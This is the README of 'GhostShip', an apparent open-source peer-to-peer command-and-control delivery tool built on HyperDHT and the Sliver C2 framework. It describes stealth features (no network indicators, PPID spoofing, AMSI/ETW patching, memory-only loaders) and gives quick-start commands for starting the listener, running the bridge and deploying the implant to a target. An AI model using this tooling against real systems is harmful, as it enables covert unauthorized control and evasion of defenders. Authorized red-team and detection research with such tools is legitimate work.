# GhostShip

## P2P Command & Control System
### [v1.0.0](RELEASE_NOTES.md) 🚢👻

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Purpose: Research](https://img.shields.io/badge/Purpose-Academic%20Research-blue.svg)](#)
[![Status: Alpha](https://img.shields.io/badge/Status-Alpha-red.svg)](#)

---

## Overview

**GhostShip** is a peer-to-peer (P2P) command and control delivery system built on top of [HyperDHT](https://github.com/holepunchto/hyperdht) and the [Sliver C2 framework](https://github.com/BishopFox/sliver). It utilizes [Holesail](https://github.com/holesail/holesail) technology to create a stealthy, resilient communication bridge that requires no public infrastructure, no domain names, and exposes **zero network indicators** on the target side.

- ✅ **No Public IPs or Domains**: Communicates via DHT keys.
- ✅ **Automatic NAT Traversal**: High-performance P2P holepunching.
- ✅ **Zero Network Indicators**: Uses kernel-level pipes (Anonymous/Named) for IPC, leaving `netstat` and `ss` completely blank on the target.
- ✅ **Cross-Platform Stealth**: Purpose-built resident loaders for both Linux and Windows.

---

## ⚠️ DISCLAIMER

**This project is intended EXCLUSIVELY for:**
- Academic security research
- Authorized penetration testing engagements
- Capture The Flag (CTF) competitions
- Defensive security research and detection development

**Unauthorized access to computer systems is illegal. Always obtain explicit written authorization before deploying any C2 infrastructure.**

---

## Key Features

- **Universal Architecture**: A single project tree for **Linux** and **Windows**.
- **Windows Hardening**: Integration of **PPID Spoofing** and in-memory **AMSI/ETW Patching**.
- **Memory-Only Residency**: Components execute directly from RAM where supported (e.g., `memfd` on Linux).
- **Serverless Transport**: Dynamic P2P routing via HyperDHT.

---

## Architecture

```
┌─────────────────────────────────────────────────────────────────────┐
│                           OPERATOR SIDE                             │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│   Sliver Console  ──▶  Sliver Server (127.0.0.1:8888)               │
│                                 │                                   │
│                                 ▼                                   │
│                          Holesail Bridge                            │
│                   (generates connection string)                     │
│                                 │                                   │
└─────────────────────────────────┼───────────────────────────────────┘
                                  │
                         P2P Network (HyperDHT)
                                  │
┌─────────────────────────────────┼───────────────────────────────────┐
│                                 ▼            IMPLANT SIDE           │
├─────────────────────────────────────────────────────────────────────┤
│                        GhostShip Loader                             │
│               (Embedded HyperDHT + Memory Bridge)                   │
│                                 │                                   │
│                                 ▼                                   │
│                     Memory Bridge (Pipes/FD)                        │
│                                 │                                   │
│                                 ▼                                   │
│                          Sliver Implant                             │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

---

## Quick Start

### Prerequisites
- **Go 1.21+**
- **Node.js 18+**
- **Sliver C2**

### Usage

#### Step 1: Start Sliver Server
```bash
sliver > mtls --lport 8888
```

#### Step 2: Start Bridge (Operator Side)
```bash
cd bridge/nodejs
node bridge.js --port 8888 --secure
```

#### Step 3: Deploy GhostShip (Target Side)
```bash
# Build GhostShip binaries
make build-all

# Deploy to target
./implant/dist/ghostship-linux --connect "hs://s000..."
```

---

## License
MIT License - See [LICENSE](LICENSE) file for details.

---

*For academic research and authorized security testing only*
